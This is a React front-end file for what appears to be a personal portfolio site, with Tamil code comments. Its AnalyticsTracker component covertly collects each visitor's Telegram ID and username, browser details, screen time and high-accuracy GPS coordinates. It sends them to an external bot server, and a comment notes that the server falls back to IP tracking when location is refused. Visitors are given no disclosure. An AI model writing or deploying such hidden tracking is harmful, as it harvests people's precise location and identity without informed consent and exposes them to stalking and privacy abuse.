import React, { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation, useNavigate } from 'react-router-dom';
import { ArrowLeft } from 'lucide-react';
import axios from 'axios';

import GoldCoins from './components/GoldCoins';
import Home from './pages/Home';
import DestinyAboutCard from './pages/DestinyAboutCard'; 
import Projects from './pages/Projects';
import Skills from './pages/Skills';
import FlamesModal from './components/FlamesModal';
import SidebarSocials from './components/SidebarSocials';
import About from './pages/About';

function AnalyticsTracker() {
  const location = useLocation();
  const [userId, setUserId] = useState(null);
  const [startTime] = useState(Date.now());

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    let currentUserId = urlParams.get('tgId');

    // டெலிகிராம் இன்-ஆப் பிரவுசரில் இருந்து டேட்டாவைத் திரட்டுதல்
    if (!currentUserId && window.Telegram && window.Telegram.WebApp) {
      const tg = window.Telegram.WebApp;
      tg.ready();
      tg.expand(); 
      if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
        currentUserId = tg.initDataUnsafe.user.id.toString();
      }
    }

    // ஒருவேளை டெலிகிராம் ஐடி இல்லை என்றால் வெப் ஐடி உருவாக்குவது
    if (!currentUserId) {
      currentUserId = "WEB_" + Math.floor(100000 + Math.random() * 900000);
    }

    setUserId(currentUserId);
    sendInitialMetrics(currentUserId);

    return () => {
      const totalScreenTimeSec = Math.floor((Date.now() - startTime) / 1000);
      if (currentUserId) {
        navigator.sendBeacon(
          'https://rakeshakmbot.onrender.com/api/update-screen-time',
          JSON.stringify({ telegramId: currentUserId, screenTime: totalScreenTimeSec })
        );
      }
    };
  }, []);

  // பயனர் ஒவ்வொரு பக்கத்திற்கு மாறும்போதும் டிராக்கிங் செய்வது
  useEffect(() => {
    if (userId) {
      axios.post('https://rakeshakmbot.onrender.com/api/track-page', {
        telegramId: userId,
        page: location.pathname
      }).catch(err => console.error("Page track error:", err.message));
    }
  }, [location, userId]);

  // 🎯 அட்வான்ஸ்டு லொகேஷன் மற்றும் யூசர்நேம் அனுப்பும் ஃபங்க்ஷன்
  const sendInitialMetrics = async (tgId) => {
    const browser = navigator.userAgent;
    const screenSize = `${window.innerWidth}x${window.innerHeight}`;

    // 🚀 பிக்ஸ் 1: டெலிகிராம் வெப்-ஆப் சூழலில் இருந்து துல்லியமாக யூசர்நேமை பிரித்தெடுத்தல்
    let tgUsername = "No Username";
    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe?.user) {
      const tgUser = window.Telegram.WebApp.initDataUnsafe.user;
      tgUsername = tgUser.username ? `@${tgUser.username}` : "No Username";
    }

    // HTML5 ஜியோலோகேஷன் கோரிக்கை
    if (navigator.geolocation) {
      const geoOptions = {
        enableHighAccuracy: true, 
        timeout: 25000, // பயனர் அனுமதி வழங்குவதற்கு 25 விநாடிகள் டைம் லிமிட்
        maximumAge: 0             
      };

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          console.log("GPS Found! Lat:", lat, "Lon:", lon);

          // 🚀 பிக்ஸ் 2: தேவையில்லாத பிரண்ட்-எண்ட் ஜியோகோடிங்கை நீக்கிவிட்டு,
          // லேடிடியூட், லாங்கிடியூட் மற்றும் யூசர்நேமை நேரடியாக பேக்-எண்டிற்கு பாய்ச்சுதல்
          await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
            telegramId: tgId, 
            username: tgUsername,
            browser, 
            screenSize, 
            latitude: lat, 
            longitude: lon
          }).catch(err => console.error("Metrics send error:", err.message));
        },
        async (error) => {
          console.log("GPS Blocked or Denied by user. Sending payload to server...");
          // ஒருவேளை பயனர் மறுத்தால், லேடிடியூட் நல் (Null) ஆக செல்லும், சர்வர் IP டிராக்கிங்கை பயன்படுத்தும்
          await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
            telegramId: tgId, 
            username: tgUsername,
            browser, 
            screenSize, 
            latitude: null, 
            longitude: null 
          }).catch(err => console.error("Metrics backup error:", err.message));
        },
        geoOptions
      );
    } else {
      // பிரவுசரில் லொகேஷன் வசதி இல்லை என்றால்
      await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
        telegramId: tgId, 
        username: tgUsername,
        browser, 
        screenSize, 
        latitude: null, 
        longitude: null
      }).catch(err => console.error("Metrics fallback error:", err.message));
    }
  };

  return null;
}

function CenterNavigationTrigger() {
  const location = useLocation();
  const navigate = useNavigate();
  if (location.pathname !== "/") return null;

  return (
    <div className="absolute inset-0 flex flex-col items-center justify-center z-30 pointer-events-none">
      <button
        onClick={() => navigate('/here')}
        className="group flex flex-col items-center justify-center pointer-events-auto bg-transparent border-none outline-none focus:outline-none active:scale-95 transition-transform duration-200"
      >
        <h1 className="font-sans text-4xl md:text-5xl font-black uppercase tracking-wider text-white transition-colors duration-300 group-hover:text-red-500">
          RAKESH DANIEL
        </h1>
        <span className="font-mono text-xs text-zinc-400 uppercase tracking-widest mt-2 transition-colors duration-300 group-hover:text-zinc-200 animate-pulse">
          click here
        </span>
      </button>
    </div>
  );
}

function GlobalBackButton() {
  const location = useLocation();
  const navigate = useNavigate();
  if (location.pathname === "/" || location.pathname === "/flames") return null;

  return (
    <button 
      onClick={() => navigate('/')} 
      className="fixed top-4 left-4 z-50 p-2.5 rounded-full border border-white/20 bg-zinc-900/60 backdrop-blur-md shadow-lg active:scale-95 transition flex items-center justify-center text-white/80 hover:text-white"
    >
      <ArrowLeft size={20} />
    </button>
  );
}

export default function App() {
  return (
    <Router>
      <div className="min-h-screen bg-black text-white font-sans relative overflow-x-hidden select-none">
        <AnalyticsTracker />
        <GoldCoins />
        <GlobalBackButton />
        <CenterNavigationTrigger />
        
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/here" element={<DestinyAboutCard />} />
          <Route path="/projects" element={<Projects />} />
          <Route path="/skills" element={<Skills />} />
          <Route path="/flames" element={<FlamesModal isOpen={true} onClose={() => window.location.href = '/'} />} />
        </Routes>

        <SidebarSocials /> 

        <style>{`
          body { background-color: #000000 !important; }
          .infinite-color-text { animation: textFourColors 5s infinite linear !important; }
          @keyframes textFourColors {
            0%, 100% { color: #ff3333 !important; }
            25% { color: #3366ff !important; }
            50% { color: #22cc22 !important; }
            75% { color: #eecc00 !important; }
          }
        `}</style>
      </div>
    </Router>
  );
}